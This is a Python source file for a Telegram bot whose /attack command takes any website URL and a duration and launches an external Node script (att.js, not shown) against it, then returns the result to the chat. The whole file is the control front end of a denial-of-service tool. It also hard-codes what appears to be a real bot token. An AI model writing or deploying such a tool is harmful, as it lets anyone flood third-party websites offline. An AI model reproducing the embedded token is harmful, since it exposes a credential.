import subprocess
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# Telegram bot token
TOKEN = "6311954830:AAFelhOxi5GkzecWwiQIccxvXnfc1rppOQI"

def attack(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) < 2:
        update.message.reply_text("Usage: /attack <website_url> <time_in_seconds>")
        return
    
    website_url = args[0]
    time_in_seconds = args[1]

    command = ["node", "att.js", website_url, time_in_seconds]
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        output = result.stdout.strip() if result.stdout else result.stderr.strip()
        update.message.reply_text(output)
    except Exception as e:
        update.message.reply_text(f"An error occurred: {e}")

def main():
    updater = Updater(TOKEN, use_context=True)
    dispatcher = updater.dispatcher
    dispatcher.add_handler(CommandHandler("attack", attack))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
        
